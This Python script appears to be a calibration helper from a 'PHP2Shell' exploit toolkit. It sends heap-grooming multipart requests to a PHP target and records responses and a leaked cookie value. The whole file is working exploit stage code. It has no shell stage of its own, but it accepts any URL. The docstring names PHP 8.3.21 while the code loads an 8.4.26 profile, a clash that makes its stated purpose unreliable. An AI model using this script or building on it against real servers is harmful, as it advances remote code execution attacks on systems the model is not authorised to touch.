#!/usr/bin/env python3
"""Send only the PHP2Shell phase-1 A/B pair to a loopback lab target.

This calibration helper deliberately has no terminal/RCE stage.  It is used
to tune the PHP 8.3.21 allocator profile without risking a payload built from
offsets belonging to another PHP build.
"""

from __future__ import annotations

import argparse
import dataclasses
from pathlib import Path
import sys
import urllib.parse


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent / "exploit"))

import exploit_off  # noqa: E402


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--host-header")
    parser.add_argument("--set", action="append", default=[], dest="assignments")
    parser.add_argument("--send-b", action="store_true")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()

    profile = exploit_off.load_profile(
        "php-8.4.26-amd64", None, args.assignments
    )
    target = exploit_off.Target.parse(args.url)
    if args.host_header:
        target = dataclasses.replace(target, host_header=args.host_header)
    client = exploit_off.RawHTTP(
        target,
        timeout=90.0,
        retries=3,
        retry_delay=0.25,
        insecure=False,
        log=exploit_off.Log(1),
    )

    output = args.output_dir
    if output:
        output.mkdir(parents=True, exist_ok=True)

    body, boundary = exploit_off.build_off_a(profile)
    response_a = client.post_multipart(body, boundary, expected_abort=True)
    if output:
        (output / "heap-a.response").write_bytes(response_a)
    status_a = response_a.split(b"\r\n", 1)[0].decode("latin1", "replace")
    print(f"A status={status_a!r} bytes={len(response_a)}")

    if not args.send_b:
        return 0

    body, boundary = exploit_off.build_heap_b(profile)
    response_b = client.post_multipart(body, boundary)
    if output:
        (output / "heap-b.response").write_bytes(response_b)
    status_b = response_b.split(b"\r\n", 1)[0].decode("latin1", "replace")
    try:
        cookie = exploit_off.cookie_value(response_b)
        cookie_len = len(cookie)
        cookie_prefix = urllib.parse.quote_from_bytes(cookie[:32], safe="")
    except exploit_off.ExploitError:
        cookie_len = -1
        cookie_prefix = ""
    print(
        f"B status={status_b!r} bytes={len(response_b)} "
        f"cookie_len={cookie_len} cookie_prefix={cookie_prefix}"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
